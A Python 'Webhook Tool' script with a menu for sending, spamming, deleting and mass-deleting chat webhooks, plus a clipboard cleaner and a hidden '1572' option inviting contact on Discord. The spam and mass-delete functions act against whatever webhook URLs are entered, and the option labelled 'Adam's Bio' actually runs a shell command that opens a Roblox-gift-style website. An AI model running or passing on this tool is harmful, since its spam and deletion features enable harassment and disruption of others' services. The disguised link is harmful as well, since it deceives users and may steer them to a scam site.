import requests
import time
import os
import pyperclip

def send_message():
    webhook = input("Enter Webhook URL: ")
    message = input("Enter message: ")
    response = requests.post(webhook, json={"content": message})
    print("[!] Message sent." if response.ok else "[!] Failed to send message.")
    input("Press Enter to return to menu...")

def spam_message():
    webhook = input("Enter Webhook URL: ")
    message = input("Enter message to spam: ")
    count = int(input("How many times to spam: "))
    for _ in range(count):
        requests.post(webhook, json={"content": message})
        time.sleep(1)
    print("[!] Finished spamming.")
    input("Press Enter to return to menu...")

def delete_webhook():
    webhook = input("Enter Webhook URL to delete: ")
    response = requests.delete(webhook)
    print("[!] Webhook deleted." if response.ok else "[!] Failed to delete webhook.")
    input("Press Enter to return to menu...")

def mass_delete():
    print("Enter one webhook URL per line. Type 'end' to finish.")
    while True:
        line = input("Webhook: ")
        if line.lower() == 'end':
            break
        response = requests.delete(line)
        print(f"[!] Deleted: {line}" if response.ok else f"[!] Failed to delete: {line}")

def fetch_info():
    webhook = input("Enter Webhook URL: ")
    response = requests.get(webhook)
    print(response.text)
    input("Press Enter to return to menu...")

def clean_clipboard():
    pyperclip.copy("")
    print("Clipboard has been cleared.")
    input("Press Enter to return to menu...")

def validate_webhook():
    webhook = input("Enter Webhook URL: ")
    response = requests.head(webhook)
    if response.status_code == 200:
        print("Webhook is valid.")
    else:
        print("Invalid or dead webhook.")
    input("Press Enter to return to menu...")

def secret_menu():
    print("YOOOOO\nYou found the secret menu! :3\nAdd me on Discord and message me '1572'.")
    input("Press Enter to return to menu...")

def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("==============================")
        print("        [ WEBHOOK TOOL ]")
        print("==============================")
        print("[1] Send message")
        print("[2] Spam message")
        print("[3] Delete webhook")
        print("[4] Mass delete webhooks")
        print("[5] Fetch webhook info")
        print("[6] Clipboard cleaner")
        print("[7] Validate webhook")
        print("[8] Adam's Bio")
        print("[0] Exit")
        choice = input("Select an option: ")

        if choice == "1": send_message()
        elif choice == "2": spam_message()
        elif choice == "3": delete_webhook()
        elif choice == "4": mass_delete()
        elif choice == "5": fetch_info()
        elif choice == "6": clean_clipboard()
        elif choice == "7": validate_webhook()
        elif choice == "8": os.system("start http://www.robloxgift.shop")
        elif choice == "1572": secret_menu()
        elif choice == "0": break

if __name__ == "__main__":
    main()
